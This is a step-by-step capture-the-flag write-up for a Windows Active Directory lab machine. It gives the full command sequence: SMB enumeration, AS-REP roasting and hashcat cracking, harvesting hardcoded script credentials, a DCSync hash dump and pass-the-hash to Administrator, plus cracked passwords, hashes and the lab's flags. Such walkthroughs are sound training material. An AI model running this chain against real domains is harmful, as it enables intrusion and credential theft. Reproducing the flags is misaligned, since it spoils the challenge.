# 10.10.75.186

1. Service Discovery: 

>>>rustscan -a target -- -A -oN rustScan

2. SMB enum:

>>> sudo smbclient -L 10.10.75.186


>>> sudo smbmap -H 10.10.75.186 -u anonymous

[+] IP: 10.10.75.186:445	Name: target              	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing


3. Access read-only shares:

>>> sudo smbclient //10.10.75.186/VulnNet-Business-Anonymous/

>>> mget * 



4. Because we have unauthenticaed access to SMB, we can use an impacket script called: lookupsid


lookupsid.py anything@10.10.75.186 | tee lookupsid.txt


5. Copied the roasted users into a file called roastedUsers.txt

>>> GetNPUsers.py -usersfile roastedUsers.txt -no-pass -outputfile NPUsers -dc-ip 10.10.75.186 VULNNET-RST/

6. identify the hash:

>>> nth --file NPUsers


Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory



7. crack the password:

>>> hashcat -m 18200 NPUsers /usr/share/wordlists/rockyou.txt

or 

>>> hashcat -a 0 -m 18200 NPUsers /usr/share/wordlists/rockyou.txt (-a 0 means dictionary attack)

Username: t-skid
Password: tj072889*


8. Let's enum smb again but using the newly got credentials:

>>> sudo smbmap -H 10.10.75.186 -u 't-skid' -p 'tj072889*'

[+] IP: 10.10.75.186:445	Name: target              	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing

9.  connect to the NETLOGON share with t-skid:

>>> sudo smbclient //10.10.75.186/NETLOGON -U 't-skid' --password 'tj072889*'


Downloaded this file:ResetPassword.vbs


it contains hardcoded creds:


strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"


10. enum CMB using new creds:

>>> sudo smbmap -H 10.10.75.186 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'

we have write access to $ADMIN share, so probably we can catch a shell using impacket (wmiexec or psexec etc. )


>>> wmiexec.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.8.163


Got it! Found user flag:

C:\Users\enterprise-core-vn\Desktop>type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}




11. enum user prev:

>>> net user a-whitehat


the user is a member of domin-admins, this means we can use impacket secretdumps script (DC SYNC ATTACK - works because we have overprev. user able to sync DC info)


12. dump hashes

>>> secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.8.163

13. got admin hash:


Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::



14. we can do pass the hash:

wmiexec.py vulnnet-rst.local/Administrator@10.10.8.163 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d


15. catch the root flag:

C:\Users\Administrator\Desktop>type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
